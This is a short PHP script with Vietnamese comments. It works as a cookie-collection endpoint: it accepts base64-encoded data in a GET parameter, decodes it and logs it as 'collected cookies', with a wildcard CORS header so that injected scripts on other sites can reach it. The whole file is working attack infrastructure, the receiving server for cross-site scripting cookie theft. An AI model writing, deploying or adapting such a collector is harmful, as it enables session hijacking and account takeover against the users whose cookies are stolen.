<?php
// Cho phép nhận dữ liệu từ các nguồn khác nhau
header("Access-Control-Allow-Origin: *");

if (isset($_GET['d'])) {
    $data = $_GET['d'];
    
    // Giải mã chuỗi 
    $decoded_data = base64_decode($data);
    
    // In trực tiếp dòng chữ này ra màn hình Terminal của Server
    error_log(" Cookie thu thap duoc: " . $decoded_data);
    
    echo "Done";
    exit();
}
?>